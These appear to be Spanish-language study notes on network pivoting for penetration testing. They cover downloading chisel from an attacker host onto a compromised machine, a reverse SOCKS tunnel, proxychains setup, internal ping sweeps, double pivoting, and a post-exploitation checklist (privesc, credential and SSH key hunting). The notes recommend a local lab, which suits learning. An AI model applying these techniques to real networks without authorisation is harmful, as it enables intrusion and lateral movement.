# Pivoting

## ¿Qué es?

Usar una máquina ya comprometida como intermediario para llegar a redes internas que desde Kali no puedes alcanzar directamente.

```
Kali ──────── Máquina A ──────── Máquina B
              (comprometida)      (red interna)
              10.10.10.5          192.168.1.10
```

Kali no ve a Máquina B. Máquina A sí. Pivoteas a través de A para atacar B.

---

## El flujo completo

### 1. Descubrir que hay otra red
Cuando comprometes una máquina, miras sus interfaces:

```bash
ip a
ifconfig
```

Si ves dos IPs en interfaces distintas, hay otra red:

```
eth0  10.10.10.5    ← red que ya conoces
eth1  192.168.1.1   ← red interna nueva
```

### 2. Descubrir qué máquinas hay en la red interna
Desde la máquina comprometida (ella sí ve la red interna):

```bash
# Ping sweep
for i in $(seq 1 254); do ping -c 1 192.168.1.$i | grep "64 bytes" & done

# Si tiene nmap
nmap -sn 192.168.1.0/24
```

### 3. Montar el túnel con Chisel

**En Kali:**
```bash
chisel server -p 8000 --reverse
```

**En la máquina comprometida:**
```bash
# Primero la descargas desde Kali
wget http://TU_IP/chisel
chmod +x chisel

# Luego la conectas
./chisel client TU_IP:8000 R:socks
```

### 4. Configurar Proxychains en Kali

```bash
nano /etc/proxychains.conf

# Al final del archivo, sustituye:
socks4 127.0.0.1 9050

# Por:
socks5 127.0.0.1 1080
```

### 5. Atacar la red interna desde Kali

```bash
proxychains nmap -sT 192.168.1.10
proxychains curl http://192.168.1.10
proxychains python3 exploit.py
```

---

## Dónde va cada cosa

```
Kali                          Máquina comprometida
──────────────────────        ────────────────────
chisel server                 chisel client
/etc/proxychains.conf         (nada aquí)
tus herramientas con          
proxychains delante           
```

---

## Dentro de la segunda máquina — mismo proceso

Una vez dentro de Máquina B, repites exactamente lo mismo:

```
1. ip a           → ¿hay tercera red?
2. ping sweep     → ¿qué máquinas hay?
3. linpeas        → enumerar privesc
4. privesc        → llegar a root
5. credenciales   → buscar usuarios, contraseñas, llaves SSH
6. si hay red nueva → montar otro túnel encima
```

La metodología no cambia. Solo añades una capa más de túnel.

---

## Doble pivoting

```
Kali → [túnel 1] → Máquina A → [túnel 2] → Máquina B → Máquina C
```

Chisel y proxychains aguantan múltiples túneles anidados.

En proxychains.conf añades los proxies en orden:
```bash
socks5 127.0.0.1 1080   ← primer túnel
socks5 127.0.0.1 1081   ← segundo túnel
```

---

## Resumen mental

```
Concepto   → túnel entre redes (como SSL pero para tráfico de ataque)
Chisel     → crea el túnel
Proxychains → manda el tráfico por el túnel
```

Tres comandos de chisel. Un archivo de configuración. Mismo proceso en cada máquina.

---

## Recursos para practicar

- Montar lab local en VirtualBox:
  - Kali (red NAT)
  - VM Linux con dos interfaces (red NAT + red interna)
  - VM Linux 2 solo en red interna (invisible para Kali)
- HackTricks — Tunneling and Port Forwarding
- IppSec YouTube — buscar "chisel" o "proxychains"
